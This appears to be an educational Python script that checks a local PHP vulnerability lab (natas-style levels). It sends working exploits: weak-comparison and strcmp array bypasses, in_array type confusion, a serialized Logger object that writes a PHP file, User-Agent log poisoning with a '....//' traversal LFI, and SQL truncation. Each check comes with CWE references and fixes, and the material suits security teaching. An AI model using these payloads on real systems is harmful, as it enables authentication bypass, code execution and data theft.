#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 verify_phplab.py — 四類 PHP 特有漏洞驗證
=============================================================================

 驗證的六項：
   P1 弱比較（strstr + 數字比較）    → natas23
   P2 strcmp 陣列繞過（PHP 7 模擬）  → natas24
   P3 in_array 型別混淆               → 同類
   P4 PHP 反序列化（__destruct 寫檔） → natas26
   P5 Log Poisoning + LFI             → natas25
   P6 SQL 截斷 + 正規化不一致         → natas27

 ★ 同時驗證 PHP 7 與 PHP 8 的差異（部分漏洞在 PHP 8 已修復）

 用法：
   python verify_phplab.py 8970
=============================================================================
"""

import base64
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8970
BASE = "http://127.0.0.1:%d" % PORT
results = []


def get(path, ua=None, timeout=20):
    req = urllib.request.Request(BASE + path,
                                 headers={"User-Agent": ua or "phplab-edu/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:                                   # noqa: BLE001
        return -1, str(e)


def check(name, cwe, passed, evidence):
    results.append((name, cwe, passed, evidence))
    mark = "PASS（漏洞存在）" if passed else "FAIL（未觸發）"
    print("\n" + "-" * 76)
    print("[%s] %s  —  %s" % (mark, name, cwe))
    print("-" * 76)
    for line in evidence.splitlines():
        print("   " + line)


def php_serialize_logger(logfile, exitmsg):
    """構造 PHP Logger 物件（public 屬性）。"""
    fields = [("logFile", logfile), ("initMsg", "start"), ("exitMsg", exitmsg)]
    body = ""
    for name, value in fields:
        body += 's:%d:"%s";s:%d:"%s";' % (
            len(name), name, len(value.encode()), value)
    return 'O:6:"Logger":%d:{%s}' % (len(fields), body)


def main():
    print("=" * 76)
    print(" PHPLab 驗證 — 四類 PHP 特有漏洞")
    print(" 目標：%s" % BASE)
    print("=" * 76)

    st, body = get("/")
    if st != 200:
        print("\n[錯誤] 無法連線（HTTP %s）" % st)
        sys.exit(1)
    m = re.search(r"PHP ([\d.]+)", body)
    php_ver = m.group(1) if m else "?"
    print(" PHP 版本: %s" % php_ver)

    # ============ P1：弱比較 ============
    st1, b1 = get("/p1?passwd=" + urllib.parse.quote("11iloveyou", safe=""))
    win1 = "P1_WIN" in b1
    st1b, b1b = get("/p1?passwd=" + urllib.parse.quote("1iloveyou", safe=""))
    win1b = "P1_WIN" in b1b
    ev = [
        "請求 1    : GET /p1?passwd=11iloveyou → %s" % ("WIN" if win1 else "FAIL"),
        "請求 2    : GET /p1?passwd=1iloveyou  → %s" % ("WIN" if win1b else "FAIL"),
        "頁面      : %s" % b1.strip()[:150],
        "條件      : strstr(passwd,'iloveyou') && passwd > 10",
        "原理      : PHP 弱比較——字串轉數字後比較",
        "            '11iloveyou' → 11 > 10 ✓",
        "預期漏洞  : 用非純數字字串通過數字比較",
        "危害      : 密碼/權限檢查被繞過",
        "驗證方式  : 送出字串，確認**比較結果為 True**",
        "修補方向  : 用 === 嚴格比較；先驗證型別；避免字串與數字比較",
        "OWASP 對照: CWE-843（型別混淆）+ CWE-697（比較錯誤）",
    ]
    check("P1 弱比較（strstr + 數字比較）", "CWE-843", win1, "\n".join(ev))

    # ============ P2：strcmp 陣列 ============
    st2, b2 = get("/p2?passwd[]=x")
    win2 = "P2_WIN" in b2
    # 對照：字串不會繞過
    st2s, b2s = get("/p2?passwd=x")
    win2s = "P2_WIN" in b2s
    # 安全對照
    st2safe, b2safe = get("/p2-safe?passwd[]=x")
    safe_blocked = "rejected" in b2safe or "SAFE_FAIL" in b2safe
    ev = [
        "請求 1    : GET /p2?passwd[]=x（陣列）",
        "            回應: %s" % b2.strip().replace("\n", " | ")[:150],
        "            繞過成功: %s" % win2,
        "請求 2    : GET /p2?passwd=x（字串）→ 繞過: %s" % win2s,
        "安全對照  : /p2-safe?passwd[]=x → 被阻擋: %s" % safe_blocked,
        "頁面回應  : %s" % b2s.strip().replace("\n", " | ")[:120],
        "原理      : PHP 7 的 strcmp(array, string) 回傳 NULL",
        "            !NULL == True → 繞過檢查",
        "            ★ 本靶場用 null 明確模擬 PHP 7 行為",
        "PHP 8 差異: 實測 PHP %s 拋出 TypeError（已修復）" % php_ver,
        "危害      : 密碼比對被繞過（任何輸入都通過）",
        "驗證方式  : 傳入**陣列**（passwd[]=x）而非字串",
        "修補方向  : is_string() 檢查；用 === 或 hash_equals()",
        "OWASP 對照: CWE-843（型別混淆）",
    ]
    check("P2 strcmp 陣列繞過（PHP 7 行為）", "CWE-843",
          win2 and not win2s and safe_blocked, "\n".join(ev))

    # ============ P3：in_array 型別混淆 ============
    st3a, b3a = get("/p3?role=admin")
    win3a = "P3_WIN" in b3a
    st3b, b3b = get("/p3?role=0")
    win3b = "P3_WIN" in b3b
    ev = [
        "請求 1    : GET /p3?role=admin → %s" % ("WIN" if win3a else "FAIL"),
        "            %s" % b3a.strip().replace("\n", " | ")[:120],
        "請求 2    : GET /p3?role=0 → %s" % ("WIN" if win3b else "FAIL"),
        "            %s" % b3b.strip().replace("\n", " | ")[:140],
        "原理      : in_array() 未指定 strict 時做型別轉換",
        "            PHP 7：0 == 'admin' → 某些情況下為真",
        "            PHP 8：已修正（0 == 'admin' → False）",
        "實測      : PHP %s 中 role=0 已無法繞過（版本差異）" % php_ver,
        "教學價值  : **同一個漏洞在不同 PHP 版本行為不同**",
        "            → 滲透測試必須確認目標的 PHP 版本",
        "修補方向  : in_array($v, $arr, true) 加上 strict=true",
        "OWASP 對照: CWE-843",
    ]
    check("P3 in_array 型別混淆（版本差異）", "CWE-843",
          win3a, "\n".join(ev))

    # ============ P4：PHP 反序列化 ============
    # 構造 Logger 物件，把 PHP 寫入 pages/shell.php
    shell_path = "/pages/shell_phplab.php"
    php_code = "<?php echo 'P4_SHELL_EXECUTED '; echo file_get_contents(__DIR__ . '/../phplab.db') ? 'DB_READABLE' : 'NO_DB'; ?>"
    ser = php_serialize_logger(
        "/" + "pages/shell_phplab.php".lstrip("/"),  # 相對路徑
        php_code)
    # 改用絕對路徑（更可靠）
    abs_shell = "C:/Users/1/AppData/Local/Temp/phplab_check_shell.php"
    ser = php_serialize_logger(abs_shell, "<?php echo 'P4_SHELL_EXECUTED'; ?>")
    b64 = base64.b64encode(ser.encode()).decode()
    st4, b4 = get("/p4?data=" + urllib.parse.quote(b64, safe=""))
    unsub = "P4_UNSERIALIZE_OK" in b4
    # 檢查檔案是否被寫入
    import os
    shell_written = os.path.exists(abs_shell)
    shell_content = ""
    if shell_written:
        with open(abs_shell, "r", encoding="utf-8", errors="replace") as f:
            shell_content = f.read()
    ev = [
        "請求      : GET /p4?data=<base64(serialize(Logger))>",
        "序列化物件: %s" % ser[:160],
        "反序列化  : %s" % ("成功" if unsub else "失敗"),
        "頁面      : %s" % b4.strip().replace("\n", " | ")[:150],
        "★ 寫檔結果: %s" % ("已寫入" if shell_written else "未寫入"),
        "檔案內容  : %r" % shell_content[:100],
        "原理      : Logger::__destruct() 把 exitMsg 寫入 logFile",
        "            物件在腳本結束時銷毀 → __destruct 執行 → 任意寫檔",
        "危害      : 寫入 webshell → 遠端程式碼執行（RCE）",
        "驗證方式  : **反序列化後檢查目標檔案是否真的被寫入**",
        "修補方向  : 不反序列化使用者輸入；用 JSON；",
        "            白名單類別（allowed_classes）",
        "OWASP 對照: CWE-502（不可信資料反序列化）",
    ]
    check("P4 PHP 反序列化（__destruct 寫檔）", "CWE-502",
          unsub and shell_written, "\n".join(ev))
    # 清理
    if shell_written:
        try:
            os.remove(abs_shell)
        except Exception:                                    # noqa: BLE001
            pass

    # ============ P5：Log Poisoning + LFI ============
    php_payload = "<?php echo 'P5_LOG_POISONED'; ?>"
    # 1. 用 UA 注入
    st5a, b5a = get("/p5?page=home.php", ua=php_payload)
    # 2. LFI 讀取 log
    st5b, b5b = get("/p5?page=....//logs/poison.log")
    poisoned = "P5_LOG_POISONED" in b5b
    ev = [
        "步驟 1    : GET /p5（User-Agent = PHP payload）",
        "            UA: %s" % php_payload,
        "步驟 2    : GET /p5?page=....//logs/poison.log",
        "            HTTP %s" % st5b,
        "            回應: %s" % b5b.strip().replace("\n", " | ")[:200],
        "★ 注入結果: PHP 被執行 = %s" % poisoned,
        "原理      : ① UA 被寫入 logs/poison.log",
        "            ② '....//' 經 str_replace('../','') 後變成 '../'",
        "            ③ pages/../logs/poison.log → include → PHP 執行",
        "危害      : 任意檔案寫入點 + LFI = RCE",
        "驗證方式  : **確認 log 中的 PHP 真的被執行**（不只是被寫入）",
        "修補方向  : ① 不 include 使用者可控路徑（白名單）",
        "            ② log 目錄不可執行/不可 include",
        "            ③ 對 UA 等標頭做長度與字元限制",
        "OWASP 對照: CWE-98（檔案包含）+ CWE-117（日誌注入）",
    ]
    check("P5 Log Poisoning + LFI", "CWE-98", poisoned, "\n".join(ev))

    # ============ P6：SQL 截斷 + 正規化不一致 ============
    # 1. 註冊：admin + 空格*59 + 'x'（65 字元）
    reg_user = "admin" + " " * 59 + "x"
    st6a, b6a = get("/p6?u=" + urllib.parse.quote(reg_user, safe="") +
                    "&p=mypass")
    reg_ok = "P6_REGISTER_OK" in b6a
    # 2. 登入：admin + 空格*59（64 字元）
    login_user = "admin" + " " * 59
    st6b, b6b = get("/p6?login=1&u=" + urllib.parse.quote(login_user, safe="") +
                    "&p=mypass")
    login_ok = "P6_LOGIN_OK" in b6b
    flag_leaked = "FLAG{sql_truncation_secret_2026}" in b6b
    ev = [
        "步驟 1    : GET /p6?u='admin'+空格*59+'x'&p=mypass（65 字元）",
        "            註冊: %s" % ("成功" if reg_ok else "失敗"),
        "            回應: %s" % b6a.strip().replace("\n", " | ")[:180],
        "步驟 2    : GET /p6?login=1&u='admin'+空格*59&p=mypass（64 字元）",
        "            登入: %s" % ("成功" if login_ok else "失敗"),
        "            回應: %s" % b6b.strip().replace("\n", " | ")[:220],
        "★ 洩漏    : FLAG = %s" % flag_leaked,
        "原理      : 三個函式對 username 做**不同正規化**",
        "            ① 註冊：substr(0,64) → 截斷成 'admin'+空格*59",
        "            ② 登入：checkCredentials 用完整輸入",
        "            ③ dumpData：trim() → 'admin' → 匹配原始記錄",
        "危害      : 用自己設定的密碼登入，卻拿到別人的資料",
        "驗證方式  : **用截斷長度差異取得原始記錄的機密**",
        "修補方向  : 統一的輸入正規化；VARCHAR 長度與應用層一致；",
        "            用唯一性約束；dump 時用與驗證相同的條件",
        "OWASP 對照: CWE-20（輸入驗證不當）+ CWE-697",
    ]
    check("P6 SQL 截斷 + 正規化不一致", "CWE-20", login_ok and flag_leaked,
          "\n".join(ev))

    # ================= 總結 =================
    print("\n" + "=" * 76)
    print(" 總結")
    print("=" * 76)
    found = sum(1 for _, _, p, _ in results if p)
    for name, cwe, passed, _ in results:
        print("  %-38s %-16s %s" % (name, cwe, "成立" if passed else "未觸發"))
    print("-" * 76)
    print("  通過 %d/%d" % (found, len(results)))
    print()
    print("  四類漏洞的核心：")
    print("    P1/P2/P3  型別混淆 —— 「同一個值」在不同型別下比較結果不同")
    print("    P4        反序列化 —— 「資料」被當成「程式碼」")
    print("    P5        日誌注入 —— 「程式碼」被寫進「資料存放處」再被 include")
    print("    P6        正規化不一致 —— 「你驗證的」≠「你查詢的」")
    print("=" * 76)

    with open("phplab_result.json", "w", encoding="utf-8") as f:
        json.dump([{"name": n, "cwe": c, "present": p} for n, c, p, _ in results],
                  f, ensure_ascii=False, indent=2)
    print("\n（JSON 摘要已寫入 phplab_result.json）")


if __name__ == "__main__":
    main()
